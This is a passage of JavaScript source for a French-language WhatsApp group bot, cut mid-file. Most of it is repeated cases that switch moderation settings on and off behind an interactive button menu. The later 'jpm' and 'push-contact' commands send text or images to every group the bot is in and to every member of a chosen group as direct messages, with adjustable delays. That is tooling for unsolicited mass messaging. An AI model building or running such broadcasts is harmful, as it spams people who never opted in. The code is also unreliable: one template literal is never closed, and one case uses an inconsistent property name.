                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti-video':{
            	if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antivideo = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antivideo = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti-virtex': case 'anti-virus':{
		         if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antivirtex = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antivirtex = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
			case 'indisponible':
                if (!TontonKev) return KevStickOwner()
                if (q === 'on') {
                    db.settings[botNumber].online = true
                    replygckev(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].online = false
                    replygckev(`Successfully changed unavailable to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'bienvenue':
            case 'aurevoir': {
               if (!m.isGroup) return KevStickGroup()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].welcome = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].welcome = false
                  replygckev(`${command} desactivey`)
               }else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
case 'groupe-event': {
               if (!m.isGroup) return KevStickGroup()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].setinfo = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].setinfo = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break 
			case 'anti-vueunique':{
		         if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antiviewonce = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antiviewonce = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti-media':{
		         if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antimedia = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antimedia = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti-document':{
		         if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antidocument = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antidocument = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti-contact':{
		         if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
         
               if (args[0] === 'on') {
                  db.groups[m.chat].anticontact = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].anticontact = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti-localisation':{
		         if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].antilocation = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antilocation = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti-lien': {
               if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].antilink = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antilink = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
			case 'anti-bot':{
		         if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].antibot = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antibot = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
			case 'epingler': {
if (!TontonKev) return KevStickOwner()
if (m.isGroup) return KevStickPrivate()
Kev.chatModify({ pin: true }, m.chat)
}
break
case 'desepingler': {
if (!TontonKev) return KevStickOwner()
if (m.isGroup) return KevStickPrivate()
Kev.chatModify({ pin: false }, m.chat)
}
break
			case 'tout-effacer': {
if (!TontonKev) return KevStickOwner()
Kev.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
			case 'voir-membre': case 'cekmember':{
                                if (!m.isAdmin && !TontonKev) return KevStickAdmin()
                                if (!m.isGroup) return KevStickGroup()
replygckev(`Groupe: *${groupMetadata.subject}*\nNombre Total De Membre: *${participants.length}*`)
                                }
                                break
			case 'jpm': case 'post': case 'push-contactgc': {
if (!TontonKev) return KevStickOwner()
if (!m.isGroup) return KevStickGroup()
if (!text) return replygckev(`*Usage*\n${prefix+command} texte|pause\n\nVeuillez repondre a une image si vou voulez envoyer cette image dans tous les groupes\nPour une pause, 1000 = 1 second\n\nExemple: ${prefix + command} hey|9000`)
await replygckev(`encours...`)
let getGroups = await Kev.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Kev.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Kev.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await Kev.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Kev.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
replygckev(`Succes`)
}
break
			case 'push-contact': {
    if (!TontonKev) return KevStickOwner()
    if (!m.isGroup) return KevStickGroup()
    if (!text) return replygckev(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygckev(`message send aux contact avec succes)
    for (let pler of mem) {
    Kev.sendMessage(pler, { text: q})
     }  
     replygckev(`Done`)
      }
      break
case 'push-contactv2':{
if (!TontonKev) return KevStickOwner()
if (!q) return replygckev(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
try {
const metadata2 = await Kev.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
Kev.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygckev(`Success`)
} catch {
	replygckev(`Usage\n${prefix+command} idgc|text`)
	}
}
break
case 'push-contactv3': {
if (!TontonKev) return KevStickOwner()
if (!m.isGroup) return KevStickGroup()
if (!text) return replygckev(
`
*Exemple d usage  :*

${prefix+command} pause|texte

‼️ Veuillez repondre a une image pour l envoyera tous les Participants, Pour une pause, 1000 = 1 second
`
)
try {
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await Kev.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await Kev.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(jedany)
} else {
await Kev.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
replygckev(`Succes`)
} catch {
	replygckev(
`
*Exemple d usage :*

${prefix+command} pause|text

‼️Veuillez repondre a une image pour l envoyera tous les Participants, Pour une pause, 1000 = 1 second
`
)
}
}
break
			case 'auto-sticker': case 'autostickergc':
if (!TontonKev) return KevStickOwner()        
                if (q == 'on') {
                    db.settings[botNumber].autosticker = true
                    replygckev(`Activey ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].autosticker = false
                    replygckev(`Desactivey ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
